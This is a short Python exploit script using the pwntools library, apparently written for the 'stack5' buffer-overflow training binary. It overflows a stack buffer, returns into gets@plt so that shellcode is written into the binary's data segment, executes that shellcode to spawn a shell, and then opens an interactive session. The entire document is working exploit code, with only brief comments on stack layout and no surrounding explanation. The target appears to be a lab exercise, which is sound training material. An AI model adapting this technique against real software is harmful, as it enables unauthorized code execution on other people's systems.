from pwn import *

shellcode = asm(shellcraft.i386.linux.sh())
gets_plt = 0x80482e8 # 0x80482e8 <gets@plt> 
DATA_SEGMENT = 0x080495a4
BINARY = "./stack5"
r = process(BINARY)
raw_input("attach " + str(r.proc.pid)+"\nDebug?")

payload = "A"*(0x50-0x10) # buff esp+0x10 | sub    esp,0x50
payload += "B"*8 # stack agliment | and	esp,0xfffffff0
payload += "C"*4 # ebp
payload += p32(gets_plt) # ret
payload += p32(DATA_SEGMENT) # return after gets
payload += p32(DATA_SEGMENT) # argv of gets
r.sendline(payload)

r.sendline(shellcode) # gets(DATA_SEGMENT)
r.interactive()
